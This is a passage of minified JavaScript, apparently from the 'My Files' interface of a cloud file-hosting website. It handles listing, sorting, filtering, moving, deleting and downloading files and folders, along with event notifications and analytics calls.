v=(t=0,0==r?0:(t=(t=Math.floor(r/n)*u-d/2)<0?0:t,t=Math.floor(t/c)*c)),w=v+f-1;w>tH.aca.length&&(w=tH.aca.length),w>aog&&(aog=w),aHK=Math.floor(r/n)*u,aaa&&(f>tH.aca.length||w>tH.aca.length-f)&&!afv()&&"multiple_keys"!=tH.currentFolder.shared_type&&aaa(!0),(v!=avg||w!=aQN||aiz||e||aBX)&&(aiz=!1,function(){for(var e=[],t=v;t<w+1;t++){var a;if((a=window.tH.aca[t])&&aRS(a)){var o=a.quickkey?"#file-"+a.quickkey:"#folder-"+a.folderkey;0==$(o).length&&(e.push(t),aRX(a)&&aBE(a))}}var n=[];$.each($("#main_list li"),(function(e,t){var a=parseInt($(t).data("rownum"));(a<v||a>w)&&n.push(a)})),v<avg?(e.length>0&&y(e,!0),n.length>0&&g(n)):(e.length>0&&y(e),n.length>0&&g(n,!0)),avg=v,aQN=w}()),aBX&&(m(aSb),aBX=!1),aCo&&(m(0),aCo=!1)}aiz&&(aiz=!1)}function GetParentName(e){return window.tH.folders.memory[e].name}function XB(e){var t=bfw();return $.map(e,(function(e,a){if(e.relevancy||t){if("folder"===e.type&&e.folderkey||t&&e.folderkey){var o=window.tH.folders.yx(e.folderkey);return o||(o=new window.tH.yJ(e)),o.parent_name||e.parent_name||(o.parent_name=window.tH.currentFolder.name),t&&!o.parent&&(o.parent=window.tH.folders.yx("trash")),o.parent_chunk=1,templates.folder_row(aye($.extend({},o,e)))}if("file"===e.type&&e.quickkey||t&&e.quickkey){var n=window.tH.files.yx(e.quickkey);return n||(n=new window.tH.Cp(e)),n.parent_name||e.parent_name||(n.parent_name=window.tH.currentFolder.name),t&&!n.parent&&(n.parent=window.tH.folders.yx("trash")),templates.file_row(akl($.extend({},n,e)))}return""}return tH.yJ.aaW(e)&&e.folderkey?(aek&&0===avH(e.flag,1)&&(e.shared=""),templates.folder_row(aye(e))):tH.Cp.Zo(e)&&e.quickkey?templates.file_row(akl(e,{axn:parseInt(axn)})):""})).join("")}function UO(){return $("#myfiles_wrap").hasClass("thumbnailView")}function aCN(){return $("#myfiles_wrap").hasClass("doc-view")}function aKd(){return{order_by:sortBy,order_direction:sortAscending?"asc":"desc"}}function aLo(){return aHa}function bz(){return Math.ceil($window.height()/23)}var aXb=0,aWV=!1;function aRG(){if(aWV)aXb++;else{aWV=!0;for(var e=0;e<tH.aca.length;e++){var t=tH.aca[e];t.itemrownum=e,window.tH.aca[e]=t,void 0!==t&&t.quickkey?(window.tH.files.Yx(t.quickkey,t),$mainList.find("li#file-"+t.quickkey).attr("data-rownum",e)):(window.tH.folders.Yx(t.folderkey,t),$mainList.find("li#folder-"+t.quickkey).attr("data-rownum",e))}aXb>0?(aXb--,aRG()):aWV=!1}}function aoQ(e,t){if(!aHS){if(window.tH.aca){for(var a=e.quickkey?"quickkey":"folderkey",o=0;o<window.tH.aca.length;o++)if(window.tH.aca[o][a]==e[a])return}else window.tH.aca=[];if(e.newclass=!0,e.itemrownum=0,window.aQP(1),window.tH.aca.unshift(e),$("#emptyfolder_upload").hide(),bfw()&&$("#trash_restoreAll, #trash_deleteAll").show(),tH.currentFolder.folderkey==e.parent.folderkey&&(e.quickkey?tH.currentFolder.files[e.quickkey]=e:tH.currentFolder.folders[e.folderkey]=e),(0==$mainList.find("li:first").length||0==parseInt($mainList.find("li:first").data("rownum")))&&window.aRS(e)){var n=XB([e]),r=$(e.quickkey?"#file-"+e.quickkey:"#folder-"+e.folderkey);r.length>0&&r.remove(),$mainList.prepend(n),e.folderkey&&tH.currentFolder.folderkey&&Xb&&Xb.aVp(e,tH.currentFolder.folderkey),t||(e.quickkey?($("#file-"+e.quickkey).hide(0),$("#file-"+e.quickkey).slideDown(1e3,"easeOutExpo")):($("#folder-"+e.folderkey).hide(0),$("#folder-"+e.folderkey).slideDown(1e3,"easeOutExpo")))}aRG(),axm($mainList)}}function aQO(e,t,a){var o;a||(a=0),e&&window.tH.aca[e.itemrownum-a]&&e.quickkey&&e.quickkey==window.tH.aca[e.itemrownum-a].quickkey||e&&window.tH.aca[e.itemrownum-a]&&e.folderkey&&e.folderkey==window.tH.aca[e.itemrownum-a].folderkey?window.tH.aca.splice(e.itemrownum-a,1):$.each(window.tH.aca,(function(t,a){e&&a&&(e.quickkey&&a.quickkey==e.quickkey||e.folderkey&&a.folderkey==e.folderkey)&&window.tH.aca.splice(t,1)})),o=e.quickkey?"#file-"+e.quickkey:"#folder-"+e.folderkey,e.folderkey&&Xb&&Xb.aVb(e.folderkey);var n=$(o);return n.length>0&&(t?n.hide():n.slideUp(1e3,"easeOutExpo")),n.remove(),0==$("#main_list li").length&&0==tH.aca.length?aQx(null,tH.currentFolder)?($("#emptyfolder_upload").show(),window.tH.aca=[],bfw()&&$("#trash_restoreAll, #trash_deleteAll").hide()):$(window).hashchange():aRG(),!1}function asE(e){var t=$mainList.find("li#file-"+e.quickkey);t.hasClass("new");if(t.length>0){var a=parseInt(t.data("rownum"));e.itemrownum=a,window.tH.aca[a]=e;var o=!1,n=!1;return t.hasClass("new")&&(n=!0),t.hasClass("imgpreview-active")&&(o=!0),$mainList.find("li#file-"+e.quickkey).replaceWith(XB([e])),o&&$mainList.find("li#file-"+e.quickkey).addClass("imgpreview-active"),n&&$mainList.find("li#file-"+e.quickkey).addClass("new"),$.publish("image/update",[e]),!0}return!1}function asN(e,t){var a=$mainList.find("#folder-"+e.folderkey),o=a.hasClass("new");if(a.length>0){var n=parseInt(a.data("rownum"));e.itemrownum=n,window.tH.aca[n]=e,a.replaceWith(XB([e])),a=$mainList.find("#folder-"+e.folderkey),o&&a.addClass("new"),void 0!==e.overflow&&"yes"===e.overflow?(a.attr("title",Encoder.XSSEncode(e.name)+", Many files or folders"),a.find(".extraInfo").removeClass("hide")):(t||void 0!==e.total_folders&&void 0!==e.total_files)&&(a.attr("title",Encoder.XSSEncode(e.name)+", Folders: "+(e.total_folders||0)+", Files: "+(e.total_files||0)),a.find(".extraInfo").removeClass("hide"))}}function aNq(e,t){return $(t).data("key")}function aiJ(e){return $(e.target).closest("li").attr("id").split("-").shift()}function agu(e){return aNq("",$(e.target).closest("li"))}function ahz(e){var t=OK();return-1!=t.files.search(e)||-1!=t.folders.search(e)}function adb(e,t){return"folder"==t?{folders:[e]}:{files:[e]}}function adn(e){return afZ()>0&&ahz(agu(e))?agL():adb(agu(e),aiJ(e))}function OK(){return{files:tH.MYF_oSelected.files.join(","),folders:tH.MYF_oSelected.folders.join(",")}}function agL(){var e=OK();return{files:e.files.length>0?e.files.split(","):[],folders:e.folders.length>0?e.folders.split(","):[]}}function aiO(){var e=aoj();return e.files.concat(e.folders).join(",")}function afZ(){var e=agL();return e.files.length+e.folders.length}function aRM(e){try{gtag("event","view_image_gallery")}catch(e){}var t=window.tH.MYF_oSelected.files;if(t.length){var a=tH.files.yx(t[0]),o="/view/"+t.join(",")+"/gallery";"image"!=a.filetype&&(o=a.clickLink&&1==t.length?a.clickLink:"/view/"+t.join(",")),e?e.attr("href",o):window.open(o)}else aH(0,"You must select at least one file to view.")}function akO(e,t){e.files||(e.files=[]),e.folders||(e.folders=[]);try{if(1==e.files.length&&e.folders.length<1){var a=tH.files.yx(e.files[0]);a||(a={filename:"",filetype:"unknown",quickkey:e.files[0]});var o=agW(a,"download");"Internet Explorer"==BrowserName()&&"9.0"==Bm()?"http:"==window.top.location.protocol?window.location=o:window.top.location=o:("https:"==window.top.location.protocol&&(o=o.replace(/^http\:/i,"https:")),window.open(o))}else adP(e);try{gtag("event","download",{event_label:t||"unknown"})}catch(e){}try{window.sendinblue.track("DOWNLOAD")}catch(e){}}catch(e){LogDlErrorMyFiles(e,"MYF:akO()")}}function MYF_DirectDownload(e){akO(e,"list_item")}function aki(){if(!fu&&!hq)return Ck(),!1;var e=[];e=afv()?tH.XE:tH.currentFolder.files;var t=[];return $.each(e,(function(e,a){"image"==a.filetype&&t.push(a.quickkey)})),akO({files:t,folders:[]},"context_menu"),!1}function MYF_CompletionCounter(e){this.completed=0,this.to_complete=e}function aeP(e,t){if(t.inc()){if(tH.currentFolder=tH.root,akJ()>1?tH.root.owner_name="Custom View":tH.root.owner_name=alu(),window.location.hash.slice(1).length>0&&window.location.hash.slice(1)!=tH.currentFolder.folderkey){var a=tH.folders.yx(window.location.hash.slice(1));a&&a&&(tH.currentFolder=a)}tH.currentFolder.share_type="multiple_keys",bcB&&($("#folder_author").attr("title",'shared by "'+bcB+'"').text('shared by "'+bcB+'"'),$("#collabmodeContact .collabContactName").text(bcB).attr("title",bcB)),$.publish("folder/load",[tH.currentFolder]),MYF_fHideSpinner("folders")}e||Zi(1,"Error: One or more of the files/folders that were shared<br/>are invalid or no longer exist.")}function aeI(e,t,a){var o=tH.root,n=new tH.Cp(e);n.Yw({success:function(){n.parent=o,o.files[e]=n,tH.files.Yx(e,n),n.owner_name&&"undefined"==typeof bcB&&(window.bcB=n.owner_name),n.owner_name&&n.owner_name!=bcB&&(bcB="Various Owners"),aeP(t,a)},error:function(){aeP(t,a)}})}function ahF(e,t,a){var o=tH.root,n=new tH.yJ(e);n.Yw({data:{recursive:"yes"}},{success:function(){n.parent=o,o.folders[e]=n,tH.folders.Yx(e,o.folders[e]),"undefined"==typeof bcB&&(window.bcB=n.owner_name),n.owner_name&&n.owner_name!=bcB&&(bcB="Various Owners"),aeP(t,a)},error:function(){aeP(t,a)}})}function agM(e){if(tH.aFA=!1,tH.folders.Yx(e.folderkey,e),tH.folders.memory.myfiles=e,tH.currentFolder=e,window.location.hash.slice(1).length>0&&window.location.hash.slice(1)!=tH.currentFolder.folderkey){var t=tH.folders.yx(window.location.hash.slice(1));t&&t&&(tH.currentFolder=t)}$.publish("folder/load",[tH.currentFolder]),tH.lo=!0,$.publish("folderbrowser/load",tH.currentFolder),MYF_fHideSpinner("folders")}function auF(e){$.each(e,(function(e,t){"no"!=t.shared&&""!=t.shared||(tH.myaccountfolders[t.folderkey]=t,auF(t.folders))}))}function awH(){$.each(tH.folders.memory,(function(e,t){t&&t.folderkey?"myfiles"!=e&&"myfiles"!=t.folderkey&&(t.parent||(t.parent_folderkey?t.parent=tH.folders.yx(t.parent_folderkey):t.parent=tH.folders.yx("myfiles")),t.parent&&(t.parent.folders||(t.parent.folders={}),t.parent.folders[e]=t)):delete tH.folders.memory[e]}))}function LB(){var e=aL("mfcurrentFolder")||"";if(""==window.location.hash.slice(1)){if(e&&!atC&&localStorage[MYF_sUserEnc+"-folder-"+window.location.hash.slice(1)+"-"+(sortAscending?"folders-":"files-")+sortBy+"-"+(sortAscending?"asc":"desc")+"-1"])return e}else if(!atC&&localStorage[MYF_sUserEnc+"-folder-"+window.location.hash.slice(1)+"-"+(sortAscending?"folders-":"files-")+sortBy+"-"+(sortAscending?"asc":"desc")+"-1"])return window.location.hash.slice(1);return!atC&&""==window.location.hash.slice(1)&&localStorage[MYF_sUserEnc+"-folder-myfiles-"+(sortAscending?"folders-":"files-")+sortBy+"-"+(sortAscending?"asc":"desc")+"-1"]?"myfiles":""}function apC(){return aek}function aRS(e){return"all"==filterBy||filters[filterBy](e)}function adI(){akO(tH.MYF_oSelected,"selection_bar")}function adP(e){acL(e)}function acL(e){aol(e)}function aol(e){aky(ajU(e))}function ajU(e){var t=e.files.length+e.folders.length;1==e.folders.length&&e.folders[0]==tH.currentFolder.folderkey&&(t=(parseInt(tH.currentFolder.file_count,10)||0)+(parseInt(tH.currentFolder.folder_count,10)||0));var a,o={keys:"",count:t},n=[];e.files&&((a=e.files.join())&&n.push(a));e.folders&&((a=e.folders.join())&&n.push(a));return o.keys=n.join(),o}function aky(e){fu||hq?e.count<=0?aH(0,"You must select at least two items or one folder to zip."):GH.apJ.open(e):Ck()}function aka(e){var t={files:[],folders:[]},a=tH.folders.yx(e);return $.each(a.files,(function(e,a){t.files.push({quickKey:e,size:a.size})})),$.each(a.folders,(function(e){var a=aka(e);t.folders.push({folderKey:e,files:a.files,folders:a.folders})})),t}function aiM(e){0==fu||4==fu?LoadIframeLightbox("/templates/upgrade/statistics.html",750,390):(iZ=e,DoAPopup("select_stats_popup",530,380))}function ayz(e){var t=0;$.each(e.folders,(function(e,a){ayz(a),t+=a.file_count})),e.file_count=t+sizeOf(e.files)}function ama(e){tH.configuration||(tH.configuration={}),tH.configuration.viewable||(tH.configuration.viewable={}),tH.configuration.viewable.extensions=e}function bbH(e){tH.azm=e}function aLc(){$("#dragIcon").length>0&&$("#dragIcon").is(":visible")&&$("#dragIcon").css("top",e.pageY-10).css("left",e.pageX+10).css("z-index",9999)}function aSs(){$(".logo a").click((function(e){return window.location.hash="myfiles",aeV(e),!1}))}function aSq(){aL("mfsf-"+UserEmail).length>1&&(sortBy=aL("mfsf-"+UserEmail)||"name",sortAscending=!0,"relevancy"==sortBy||"expire"==sortBy?sortBy="name":aek&&"downloads"==sortBy&&(sortBy="created")),!atC&&window.localStorage&&(localStorage.user==MYF_sUserEnc&&localStorage.current_api_version||(localStorage.clear(),localStorage.user=MYF_sUserEnc))}function aMS(){return{files:function(e){return tH.Cp.Zo(e)},folders:function(e){return tH.yJ.aaW(e)},image:function(e){return tH.Cp.Zo(e)&&"image"===e.filetype},video:function(e){return tH.Cp.Zo(e)&&"video"===e.filetype},audio:function(e){return tH.Cp.Zo(e)&&"audio"===e.filetype},document:function(e){return tH.Cp.Zo(e)&&"document"===e.filetype},spreadsheet:function(e){return tH.Cp.Zo(e)&&"spreadsheet"===e.filetype},presentation:function(e){return tH.Cp.Zo(e)&&"presentation"===e.filetype},public:function(e){return"public"==e.privacy},private:function(e){return"private"==e.privacy}}}function aSM(){$("#myfiles_filtercontrol").find(".dropdown").dropdown({useLabel:!1,command:function(e,t){tH.aca=[],filterBy=e,$.publish("list/filter"),$("#currentFilterlink").html($(t).html());var a=$("#myfiles_filtercontrol").attr("class").match(/filter.*/)[0];$("#myfiles_filtercontrol").removeClass(a).addClass("filter"+$(t).data("command").capitalize())}}),$.subscribe("list/filter",(function(){afv()&&$("#search-text").val()&&$("#search-text").val().length?afB(window.tH.currentFolder,$("#search-text").val(),tH.aVy):(tH.currentFolder.folders={},tH.currentFolder.files={},abH(tH.currentFolder)),$("#container").toggleClass("searchmode_filter","all"!=filterBy),window.scrollTo(0,0)}))}function aTX(){return{relevancy:Xz("relevancy"),folder:{name:axw("name"),created:axQ("created"),expire:axQ("delete_date")},file:{name:axw("filename"),created:axQ("created"),expire:axQ("delete_date"),size:Xz("size"),downloads:Xz("downloads")}}}function aed(){var e=function(){"name"!=sortBy?$("#container").removeClass((function(e,t){for(var a=[],o=t.split(" "),n=0;n<o.length;n++)-1!==o[n].indexOf("sort-")&&a.push(o[n]);return a.join(" ")})):$("#myfiles_sortcontrol li span").removeClass("arrow_down arrow_up"),bfw()&&(sortAscending=!0,$("#container").addClass("sort-name")),$("#container").addClass("sort-"+sortBy).removeClass("sort-ascending sort-descending").addClass(sortAscending?"sort-ascending":"sort-descending")};$("#myfiles_sortcontrol").find(".dropdown").dropdown({useLabel:!0,command:function(e,t){bfw()||(tH.aca=[]),sortBy===e?sortAscending=!sortAscending:(sortBy=e,"relevancy"!=sortBy&&"expire"!=sortBy&&"date"!=sortBy&&aU("mfsf-"+UserEmail,sortBy,2592e3)),$("#myfiles_sortcontrol li").each((function(){$(this).find("span").removeClass("arrow_down arrow_up"),$(this).data("command")==sortBy&&$(this).find("span").addClass("arrow_down")})),$.publish("list/sort")}}),$("#sort_current").delegate("span","click",(function(e){if("name"!=sortBy)sortAscending=!sortAscending;else{var t=$("#sort_current").text();"modified"==(t=(t=t.substring(0,t.search(/\s/))).toLowerCase())&&(t="created"),"available"==t&&(t="expire"),sortBy=t}"relevancy"!=sortBy&&"expire"!=sortBy&&"date"!=sortBy&&aU("mfsf-"+UserEmail,sortBy,2592e3),$.publish("list/sort"),aeV(e)})),$("#myfiles_sortbyname").on("click",(function(e){"name"==sortBy&&(sortAscending=!sortAscending),sortBy="name",aU("mfsf-"+UserEmail,sortBy,2592e3),$.publish("list/sort"),aeV(e)})),$.subscribe("list/sort",(function(){adz()||afv()&&window.tH.XE&&window.tH.XE.length>0?(MYF_SearchMode_fSortList(),e()):(bfw()||tH.currentFolder&&"trash"==tH.currentFolder.folderkey||tH.currentFolder&&(tH.currentFolder.folders={},tH.currentFolder.files={},abH(tH.currentFolder),aos(tH.currentFolder)),e()),window.scrollTo(0,0)}));var t=XO();if("trash"!=t&&"name"==sortBy)$("#container").addClass("sort-created"),e();else{"trash"==t?($("#container").addClass("sort-expire"),sortBy="name"):"expire"==sortBy&&(sortBy="name");var a=sortBy&&"relevancy"!=sortBy?sortBy:"created",o=$('#myfiles_sortcontrol li[data-command="'+a+'"]'),n=o.text();o.length>0?($("#sort_current").html(n+' <span class="arrow_down"></span>'),o.find("span").addClass("arrow_down"),e()):(sortBy="name",$.publish("list/sort"))}}function aSu(){}function aTC(){$("#owner_breadcrumb1").bind("draghover",(function(e){$(this).toggleClass("folder_highlight",e.enter),aeV(e)})),$("#followingHome a").click((function(){return top.Rz("shared-items"),!1})),$breadcrumbs.delegate("a.breadcrumb","dragenter dragover",(function(e){return e.preventDefault(),!1})),$breadcrumbs.delegate("a.breadcrumb","drop",(function(e){var t;if($(this).toggleClass("folder_highlight",!1),e.originalEvent.dataTransfer.files&&0!=e.originalEvent.dataTransfer.files.length){var a=$(this).data("key");aeV(e),e.preventDefault();var o=ev.originalEvent.dataTransfer.files;biM(ev.originalEvent.dataTransfer.items?ev.originalEvent.dataTransfer.items:null,o,(function(t){aXY((function(o){aWj(e,t,a,!0)}),t)}))}else{if(t=JSON.parse(e.originalEvent.dataTransfer.getData("Text"))){var n=(t.files?tH.files.yx(t.files.split(",")[0]):tH.folders.yx(t.folders.split(",")[0])).parent.folderkey,r=tH.folders.yx(n);aek||!avH(r.flag,"1")?LF.aFI(t.files,t.folders,$(this).data("key")):LF.YO(t.files,t.folders,$(this).data("key"))}aeV(e)}return!1})),$("#myfilesCurrentFolderNameWrap").delegate(".breadCrumbsOptions","click",(function(e){R({folders:[tH.currentFolder.folderkey]}),aeV(e)})),$folderUp.bind("draghover",(function(e){$(e.target).toggleClass("folder_highlight",e.enter)})).bind("dragover",NQ).bind("drop",(function(e){return afA=$folderUp.find("a").attr("href").substring(1),abh(e,afA),aeV(e),!1}))}function aeB(){$("#thumbnailSize").delegate("a","click",(function(){var e=$(this).attr("class"),t=e.substr(e.length-1);$("#myfiles_wrap").hasClass("size"+t)||($("#myfiles_wrap").removeClass("sizeS sizeM sizeL").addClass("size"+t),aaZ(),aU("mfsize",t,1800),$.publish("thumbmode/sizechange",[t]))})),$.subscribe("thumbmode/sizechange",(function(){$("#main_list").empty(),aBX=!0,aSb=aHK,aua()})),$.subscribe("view/changemode",(function(){contextMenu.aoh(),aCo=!0}))}function aST(){$.subscribe("folder/render",(function(e){$("#folder_infobox").toggleClass("thisfolder_root","myfiles"==e.folderkey),acv(),$(window).resize()})),$.subscribe("folder/load",(function(e){e.folderkey===tH.currentFolder.folderkey&&aps()}));var e="init";$.subscribe("folder/completed",(function(t){aek&&window.location.hash.slice(1).length>0&&("init"===e?(alb(),e="root"):"root"===e&&(e="loaded",setTimeout(aFV,500)))})),$.subscribe("folder/create",(function(e,t){aH(0,e.name+" created.","A new folder "+e.name+" has been created inside the folder "+t.name+".",!0),t.folderkey===tH.currentFolder.folderkey&&(aoQ(e),window.scrollTo(0,0)),"myfiles"!=t.folderkey&&t.parent&&t.parent.folderkey===tH.currentFolder.folderkey&&asN(t),aHa.aIX(t.folderkey)})),$.subscribe("file/create",(function(e,t){aH(0,'<span class="shortenFileName">'+htmlspecialchars(e.filename)+"</span> created.",'A new file <span class="shortenFileName">'+htmlspecialchars(e.filename)+"</span> has been created inside the folder "+t.name+".",!0),t.file_count=parseInt(t.file_count)+1,t.folderkey===tH.currentFolder.folderkey&&($("#emptyfolder_upload").hide(),aoQ(e),window.scrollTo(0,0)),aHa.aIX(t.folderkey),"myfiles"!=t.folderkey&&t.parent&&aHa.aIX(t.parent.folderkey),FI()})),$.subscribe("folder/delete",(function(e,t){var a=t?"deleted.":"moved to Trash.",o=!1;if(e instanceof Array){var n=e.length,r=!1;n>5?aH(0,n+" folders were "+a,n+" folders were "+a,!0):r=!0,$.each(e,(function(e,t){var n=tH.folders.yx(t.parent.folderkey);r&&aH(0,t.name+" "+a,"The folder "+t.name+" was "+a,!0),t.folderkey==tH.currentFolder.folderkey&&(o=!0),n&&n.folderkey==tH.currentFolder.folderkey&&aQO(t),n&&"myfiles"!=n.folderkey&&n.parent&&n.parent.folderkey==tH.currentFolder.folderkey&&asN(n)})),aHa.aIX(e[0].parent.folderkey)}else{aH(0,e.name+" "+a,"The folder "+e.name+" was "+a,!0);var i=tH.folders.yx(e.parent.folderkey);aHa.aIX(e.parent.folderkey),e.folderkey==tH.currentFolder.folderkey&&(o=!0),i&&i.folderkey==tH.currentFolder.folderkey&&aQO(e),i&&"myfiles"!=i.folderkey&&i.parent&&i.parent.folderkey==tH.currentFolder.folderkey&&asN(i)}o&&(window.location.hash="#myfiles"),mainList.aTN(),FI()})),$.subscribe("file/delete",(function(e,t){var a=t?"deleted":"moved to Trash";e.length>1?aH(0,e.length+" files "+a,e.length+" files were "+a,!0):aH(0,'<span class="shortenFileName">'+htmlspecialchars(e[0].filename)+"</span> "+a,'The file <span class="shortenFileName">'+htmlspecialchars(e[0].filename)+"</span> was "+a,!0),$.each(e,(function(e,t){if(t.relevancy)aQO(t,!1,e);else{var a=tH.folders.yx(t.parent.folderkey);aQO(t,!1,e),"myfiles"!=a.folderkey&&a.parent&&a.parent.folderkey==tH.currentFolder.folderkey&&asN(a)}})),aRG(),aHa.aIX(e[0].parent.folderkey),mainList.aTN(),FI(),t&&SegmentIdentifyWithDiskSpace()})),$.subscribe("folder/move",(function(e,t,a){e.length>1?aH(0,e.length+" folders moved.",e.length+" folders have been moved from "+t.name+" to "+a.name+".",!0):aH(0,'<span class="shortenFileName">'+htmlspecialchars(e[0].name||e[0].filename)+"<span> moved.",'<span class="shortenFileName">'+htmlspecialchars(e[0].name||e[0].filename)+"</span> has been moved from "+t.name+" to "+a.name+".",!0),aHa.aIX(a.folderkey),aHa.aIX(t.folderkey),"myfiles"!=t.folderkey&&t.parent&&aHa.aIX(t.parent.folderkey),"myfiles"!=a.folderkey&&a.parent&&aHa.aIX(a.parent.folderkey),t.parent&&aHa.aIX(t.parent.folderkey),afv()||(a.folderkey===tH.currentFolder.folderkey&&$.each(e,(function(e,t){aoQ(t)})),t.folderkey===tH.currentFolder.folderkey&&$.each(e,(function(e,t){aQO(t)}))),a.parent&&a.parent.folderkey===tH.currentFolder.folderkey&&asN(a),t.parent&&t.parent.folderkey===tH.currentFolder.folderkey&&asN(t),afv()&&$("#search").keydown(),aos(tH.currentFolder,!0),"trash"!=t.folderkey&&"trash"!=a.folderkey||beg()})),$.subscribe("file/move",(function(e,t,a){e.length>1?aH(0,e.length+" files moved.",e.length+" files have been moved from "+t.name+" to "+a.name+".",!0):aH(0,'<span class="shortenFileName">'+htmlspecialchars(e[0].name||e[0].filename)+"</span> moved.",'<span class="shortenFileName">'+htmlspecialchars(e[0].name||e[0].filename)+"</span> has been moved from "+t.name+" to "+a.name+".",!0),aHa.aIX(a.folderkey),aHa.aIX(t.folderkey),"myfiles"!=t.folderkey&&aHa.aIX(t.parent.folderkey),"myfiles"!=a.folderkey&&aHa.aIX(a.parent.folderkey),(t.parent||t.parent_folderkey)&&aHa.aIX(t.parent.folderkey||t.parent_folderkey),afv()||t.folderkey===tH.currentFolder.folderkey&&$.each(e,(function(e,t){aQO(t)})),"myfiles"!=a.folderkey&&a.parent.folderkey===tH.currentFolder.folderkey&&asN(a),"myfiles"!=t.folderkey&&t.parent.folderkey===tH.currentFolder.folderkey&&asN(t),afv()&&$("#search").keydown(),"trash"!=t.folderkey&&"trash"!=a.folderkey||beg(),FI()})),$.subscribe("folder/copy",(function(e,t,a,o){e.length>1?o&&o.name?aH(0,e.length+" folders copied.",e.length+" folders have been copied from "+a.name+" to "+o.name+".",!0):aH(0,e.length+" folders copied.",e.length+" folders have been copied from "+a.name+".",!0):aH(0,'<span class="shortenFileName">'+htmlspecialchars(e[0].name||e[0].filename)+"</span> copied.",'<span class="shortenFileName">'+htmlspecialchars(e[0].name||e[0].filename)+"</span> has been copied from "+a.name+" to "+o.name+".",!0),aHa.aIX(o.folderkey),aHa.aIX(a.folderkey),o.folderkey==tH.currentFolder.folderkey&&$.each(t,(function(e,t){aoQ(t)})),afv()&&$("#search").keydown(),FI()})),$.subscribe("file/copy",(function(e,t,a,o){e.length>1?aH(0,t.length+" files copied.",t.length+" files have been copied from "+a.name+" to "+o.name+".",!0):aH(0,'<span class="shortenFileName">'+htmlspecialchars(t[0].name||t[0].filename)+"</span> copied.",'<span class="shortenFileName">'+htmlspecialchars(t[0].name||t[0].filename)+"</span> has been copied from "+a.name+" to "+o.name+".",!0),aHa.aIX(o.folderkey),aHa.aIX(a.folderkey),o.folderkey==tH.currentFolder.folderkey&&$.each(t,(function(e,t){aoQ(t)})),afv()&&$("#search").keydown(),FI(),SegmentIdentifyWithDiskSpace()})),$.subscribe("filesandfolders/copy",(function(e,t,a,o){aH(0,e.length+" files and "+t.length+" folders copied.",e.length+" files and "+t.length+" folders have been copied from "+a.name+" to "+o.name+".",!0),aHa.aIX(o.folderkey),aHa.aIX(a.folderkey),o.folderkey==tH.currentFolder.folderkey&&($.each(e,(function(e,t){aoQ(t)})),$.each(t,(function(e,t){aoQ(t)}))),afv()&&$("#search").keydown(),FI(),SegmentIdentifyWithDiskSpace()})),$.subscribe("folder/update",(function(e,t,a){void 0===a&&(a=!0);var o=$("#folder-"+e.folderkey);!0===a&&aH(0,e.name+" updated.","The folder "+e.name+" has been modified.",!0),o.length&&asN(e),aHa.aIX(e.parent.folderkey),aos(tH.currentFolder)})),$.subscribe("file/save",(function(e){aHa.aIX("myfiles"),aH(0,'<span class="shortenFileName">'+htmlspecialchars(e)+"</span> saved to My Files.",'The file <span class="shortenFileName">'+htmlspecialchars(e)+"</span> has been saved to your account.",!0)})),$.subscribe("folder/follow",(function(e){aHa.aIX("myfiles"),aH(0,e.name+" added to My Files.","The folder "+e.name+" has been added to your account.",!0)})),$.subscribe("folder/unfollow",(function(e){var t=e;if(t){t.parent.folderkey==tH.currentFolder.folderkey&&aQO(t);var a=!1;t.folderkey==tH.currentFolder.folderkey&&(a=!0),aHa.aIX(t.parent.folderkey),aHa.aIX(t.folderkey),a&&(window.location.hash="#myfiles"),aH(0,t.name+" removed from My Files.","The folder "+t.name+" has been removed from your account.",!0)}})),$.subscribe("folders/follow",(function(e){aHa.aIX("myfiles");var t=" folders",a=" have";1==e&&(t=" folder",a=" has"),aH(0,e+t+" added to My Files.",e+t+a+" been added to your account.",!0)})),$.subscribe("document/update",(function(e){UO()&&setTimeout((function(){aBE(e)}),250)})),$.subscribe("folder/lazy_load",(function(e){UO()&&$.each(e,(function(e,t){"image"!=t.filetype&&anD(t)&&aBE(t)})),tH.ayo()})),$.subscribe("file/update",(function(e,t,a){void 0===a&&(a=!0),!0===a&&aH(0,'<span class="shortenFileName">'+htmlspecialchars(e.filename)+"</span> updated.",'The file <span class="shortenFileName">'+htmlspecialchars(e.filename)+"</span> has been modified.",!0),asE(e),e.parent.folderkey==tH.currentFolder.folderkey&&(FI(),"replace"==t&&UO()&&aCz(e)&&anD(e)&&aBE(e)),afv()&&(MYF_bNextSearchAll=void 0===window.tH.currentFolder.files[e.quickkey],afB(window.tH.currentFolder,$("#search-text").val(),MYF_bNextSearchAll)),""==e.filetype&&(e.filetype="other"),aHa.aIX(e.parent.folderkey)})),$.subscribe("file/upload",(function(e,t){var a=tH.folders.yx(e.parent.folderkey);a&&(aHa.aIX(a.folderkey),tH.currentFolder.folderkey==a.folderkey&&(asE(e)||"new"!=t||aoQ(e),UO()&&anD(e)&&aCz(e)&&aBE(e)),"myfiles"!=a.folderkey&&(aHa.aIX(a.parent.folderkey),tH.currentFolder.folderkey==a.parent.folderkey&&asN(a))),FI()}))}function apy(e,t){return MYF_fShowSpinner("folders"),new auj({container_selector:"#folderTree .folderlist_content",linked_folder_class:"nav-linked-folder"},e,t)}function aUh(){$.subscribe("folder/render",(function(e){"trash"==e.folderkey||acK||(Xb.bau(e.folderkey),Xb.aZC(e.folderkey))})),$.subscribe("folder/unfollow",(function(e){beK(e.folderkey)})),$.subscribe("folder/delete folder/remove",(function(e){$.each(e,(function(e,t){beK(t.folderkey)}))})),$.subscribe("folder/create folder/add",(function(e,t){bfr(e,t.folderkey)})),$.subscribe("folder/move",(function(e,t,a){$.each(e,(function(e,t){beK(t.folderkey),bfr(t,a.folderkey)}))})),$.subscribe("folder/update",(function(e){bfF(e)}))}function aTg(){Xb.aab.onFolderContextMenu=function(e,t){var a,o;return a="folder",o=t.folderkey,"yes"==t.shared&&(a=t.parent&&"no"!=t.parent.shared?"sublinked-folder":"linked-folder"),contextMenu.open("folderbrowser",a,aiH(e,-2,-2),o),aeV(e),!1},Xb.aab.onFolderDrop=function(e,t,a){var o;if($("#container").removeClass("drag_active"),e.originalEvent.dataTransfer.files&&0!=e.originalEvent.dataTransfer.files.length){aeV(e),e.preventDefault();var n=t.folderkey,r=ev.originalEvent.dataTransfer.files;biM(ev.originalEvent.dataTransfer.items?ev.originalEvent.dataTransfer.items:null,r,(function(t){aXY((function(a){aWj(e,t,n,!0)}),t)}))}else if("{"==e.originalEvent.dataTransfer.getData("Text").substr(0,1))try{o=JSON.parse(e.originalEvent.dataTransfer.getData("Text"));var i={};if(!(i=o.files?tH.files.yx(o.files.split(",")[0]):tH.folders.yx(o.folders.split(",")[0]))){var s=new 